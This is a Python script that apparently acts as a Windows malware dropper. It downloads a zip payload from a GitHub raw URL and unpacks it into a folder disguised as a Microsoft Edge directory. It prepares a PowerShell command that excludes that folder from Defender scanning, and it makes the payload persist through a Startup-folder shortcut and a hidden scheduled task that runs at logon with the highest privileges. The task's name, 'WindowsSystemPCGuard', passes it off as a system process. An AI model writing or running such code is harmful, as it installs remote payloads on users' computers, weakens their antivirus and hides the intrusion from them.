import os
import subprocess
import ctypes
import sys
from zipfile import ZipFile

os.system("pip install requests==2.31.0")
os.system("pip install pyautogui==0.9.54")
os.system("pip install numpy==1.26.0")
os.system("pip install opencv-python==4.8.1.78")
os.system("pip install requests==2.31.0")
os.system("pip install pywin32==306")

import requests
import win32com.client

curUrl = 'https://raw.githubusercontent.com/ScripterThing/BDPPL/main/current.txt'
current = requests.get(curUrl, allow_redirects=True)

fil = current.text[0]

url = f'https://raw.githubusercontent.com/ScripterThing/BDPPL/main/{fil}.zip'
r = requests.get(url, allow_redirects=True)

path_to_exclude = "C:\\Apps\\Windows\\MicrosoftEdge\\set"

os.makedirs("C:\\Apps\\Windows\\MicrosoftEdge\\set")

# Construct the command to add the exclusion
command = f"powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath {path_to_exclude}"

def task_scheduler_command(args):
    # Check if autorun is disabled

    # Add the task to autorun
    start_info = subprocess.STARTUPINFO()
    start_info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    start_info.wShowWindow = subprocess.SW_HIDE

    try:
        subprocess.run(
            ["schtasks.exe"] + args.split(),
            startupinfo=start_info,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=True,
        )
    except subprocess.CalledProcessError as e:
        print("Error:", e)

def set_autorun():
    autoRunName = "WindowsSystemPCGuard"
    instPath = "C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\WinHost.py"

    print(f"/create /f /sc ONLOGON /RL HIGHEST /tn \"{autoRunName}\" /tr \"{instPath}\"")

    task_scheduler_command(
        f"/create /f /sc ONLOGON /RL HIGHEST /tn \"{autoRunName}\" /tr \"{instPath}\""
    )

try:
    open(f"C:\\Apps\\Windows\\MicrosoftEdge\\set\\{fil}.zip", "wb").write(r.content)

    with ZipFile(f"C:\\Apps\\Windows\\MicrosoftEdge\\set\\{fil}.zip", "r") as z:
        z.extractall("C:\\Apps\\Windows\\MicrosoftEdge\\set")
        z.close()
        os.remove(f"C:\\Apps\\Windows\\MicrosoftEdge\\set\\{fil}.zip")

        roaming = os.getenv('AppData')
        startup = f"{roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

        # with open(f"{startup}\\WinHost.pyw", "wb") as ff:
        #     stubUrl = 'https://raw.githubusercontent.com/ScripterThing/BDPPL/main/WinHost.pyw'
        #     stubr = requests.get(stubUrl, allow_redirects=True)
        #     ff.write(stubr.content)
        
        shell = win32com.client.Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(os.path.join(startup, "WinHost.lnk"))
        shortcut.TargetPath = "C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\WinHost.pyw"
        shortcut.save()

        #set_autorun()
except subprocess.CalledProcessError as e:
    print(f"Error installing: {e}")
    os.rmdir("C:\\Apps\\Windows\\MicrosoftEdge\\set")
    os.rmdir("C:\\Apps\\Windows\\MicrosoftEdge")
